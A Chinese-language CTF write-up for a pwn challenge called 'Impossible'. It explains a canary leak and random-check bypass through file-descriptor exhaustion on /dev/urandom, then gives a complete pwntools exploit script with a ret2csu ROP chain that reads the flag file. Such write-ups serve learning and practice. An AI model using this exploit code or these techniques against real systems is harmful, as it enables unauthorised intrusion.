# Pwn #
# Impossible #
## 1. 题目分析 ##
首先上保护机制情况：  
![protect]()  
可以看到题目开了NX，Full RELRO和Stack Canary。证明无法通过修改GOT得到shell，同时分析题目发现，存在明显的栈溢出漏洞，因此考虑为ret2libc利用方式。  
### 1.1 漏洞点1 ###
![vul1]()  
该函数中存在明显的栈溢出漏洞，但由于canary的存在，需要首先leak canary。而且该函数只能被调用一次，在这考虑使用这一次栈溢出leak canary，再使用其他方法控制程序流。
### 1.2 漏洞点2 ###
![vul2]()  
当输入选择为9011时，会进入上图所示的一个函数中，可以看到该函数功能为每次从"/dev/urandom"文件中读入一个随机数，然后与用户输入的数进行比较，如果相同则可以获取再一次的栈溢出机会（复制内容为另一个函数输入到程序数据段的内容）。  

这里有一个很隐蔽的地方，就是程序在每次打开"/dev/urandom"文件后，并没有使用close函数去关闭文件句柄。因此，如果多次打开该文件，当消耗完当前所设定的最大文件句柄数后，就会打开失败，从而read函数读入的随机数为0.  

在本机环境中使用ulimit -n命令测试文件最大句柄数结果如下图所示：  
![max_fileno]()  
## 2. 利用方式 ##
### 2.1 leak canary ###
在这里不能直接使用overflow\_once函数去leak canary，因为为了防止canary别泄露，canary的最后一个字节总是'\x00'，因此如果想要打印出canary，那么必须将canary的最后一个字节改为非'\x00'的值，但这会触发stack check failed，导致程序直接结束。  

正确的leak方法为，不断调用write\_code函数（每次调用该函数会抬高栈帧0x20），因此会将不断canary保留在栈上，经过实际测试，当调用该函数3次后，栈上保留的canary就不会被main函数中的其他函数数据所覆盖，可以正常leak。

canary所在地址偏移计算公式如下所示：  
`0x110 - 0x8 - 0x20*3 = 0xa8`  
leak结果如下图所示：  
![canary]()  
### 2.2 猜测随机数 ###
这里也是后面通过看其他人的writeup才了解到，linux系统下文件句柄数是有限制的，如果多次打开文件（不关闭）则会导致耗尽文件句柄后，再次打开文件失败。因此可以采用这种方式，打开"/dev/urandom"文件1024次后，耗尽文件句柄数，然后导致下一次打开失败，从而读取到的random为0来再次实现栈溢出。

由于已经存在标准IO（stdin，stdout，stderr）三个文件描述符，因此只要再打开文件1021次，即可耗尽描述符资源。
### 2.3 栈溢出利用 ###
这里有几种思路：  
1. 由于该程序的got表不可写，考虑使用dl\_resolve去伪造一个system表项，然后让程序重新解析。但在后面具体利用时发现该程序的dynamic节中并没有JMPREL段（考虑可能原因为该程序使用了FULL RELRO技术，因此got表的解析在程序加载时就完成了，所有没有该重定位节），因此该方法不可用。或许可用，伪造该节？  
2. 考虑第二种方法，泄露libc地址，然后调用system。但发现该程序在guess\_secret函数中，如果猜中随机数，则会关闭标准输入（close(0)），因此该方法不成功。  
3. 直接open("flag",0)，然后read。
## 3.完整exp ##
<pre classs = "prettyprint lang-javascript">
from pwn import *
from ctypes import *
import os
import roputils as rop
#import roputils as rop

remote_addr = "116.62.152.176"
remote_port = 20001

local_addr = "127.0.0.1"
local_port = 1807

pc = "./pwn"
pwn_elf = ELF(pc)
pwn_rop = rop.ROP(pc)

uselibc = 2 #0 for no,1 for i386,2 for x64
local = 1
haslibc = 1
atta = 1

if uselibc == 2:
	context.arch = "amd64"
else:
	context.arch = "i386"

if uselibc ==2 and haslibc == 0:
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	if uselibc == 1 and haslibc == 0:
		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else:
		libc = ELF('./libc.so.6')

if local == 1:
	if haslibc:
		p = process(pc)
	else:
		p = process(pc)
elif local == 0:
	p = remote(remote_addr,remote_port)
	if haslibc:
		libc = ELF('./libc.so.6')
else:
	p = remote(local_addr,local_port)
	if haslibc:
		libc = ELF('./libc.so.6')

context.log_level = True

if local:
	if atta:
		#gdb.attach(p,'b *0x00000000004009E9\n b*0x0000000000400A6E')
		gdb.attach(p,'b *0x0000000000400C4A\n b *0x0000000000400965')


def sla(a,b):
	p.sendlineafter(a,b)

def sa(a,b):
	p.sendafter(a,b)

def ru(a):
	p.recvuntil(a)

def rv(a):
	return p.recv(a)

def sl(a):
	p.sendline(a)

def lg(s,addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def func3(content):
	sla('option:','3')
	sa('think?)\n',content)

def write_code(code,s):
	sla('option:','2')
	sla('...\n',code)
	sla('y/n\n',s)

def leak_canary(code):
	sla('option:','1')
	sa('play once..\n',code)
	#sleep(1)

def guess_secret(secret):
	sla('option:',str(9011))
	sa('code:',secret)


def hack():
	raw_input()
	init1 = 0x0000000000400C4A
	init2 = 0x0000000000400C30
	code_base = 0x0000000000602080
	flag_path = code_base + 0x200
	write_addr = code_base + 0x300
	puts_got = pwn_elf.got['puts']
	read_got = pwn_elf.got['read']
	open_got = pwn_elf.got['open']
	#vul_func = 0x0000000000400B15

	# symtab = pwn_rop.dynamic('SYMTAB')
	# strtab = pwn_rop.dynamic('STRTAB')
	# syment = pwn_rop.dynamic('SYMENT')
	# rel_plt = pwn_rop.dynamic('JMPREL')
	# rela_ent = pwn_rop.dynamic('RELAENT')
	# plt_got = pwn_rop.dynamic('PLTGOT')

	write_code('a','n')
	for i in range(2):
		sla('...\n','a')
		sla('y/n\n','n')
	sla('...\n','a')
	sla('y/n\n','y')
	
	leak_canary('a'*(0xa9))
	ru('a'*0xa9)
	canary = u64('\x00' + rv(7))
	lg('canary',canary)

	payload = p64(0) + p64(canary) + p64(0) + p64(init1)
	payload += p64(0) + p64(1) + p64(open_got) + p64(0) + p64(0) + p64(flag_path)
	payload += p64(init2) + p64(0)*7
	payload += p64(init1)
	payload += p64(0) + p64(1) + p64(read_got) + p64(0x100) + p64(write_addr) + p64(0) 
	payload += p64(init2) + p64(0)*7
	payload += p64(init1)
	payload += p64(0) + p64(1) + p64(puts_got) + p64(0) + p64(0) + p64(write_addr)
	payload += p64(init2) + p64(0)*7
	payload += p64(0)
	payload = payload.ljust(0x200,'\x00')
	payload += 'flag\0'
	write_code(payload,'y')

	for i in range(1022):
		guess_secret('\x00'*8)
	
	# ru('mouth...\n')
	# puts_addr = u64(rv(6).ljust(8,'\x00'))
	# libc.address = puts_addr - libc.symbols['puts']
	# system_addr = libc.symbols['system']
	# lg('system',system_addr)

	#sa('code:','\x00'*8)

	p.interactive()
hack()
</pre>
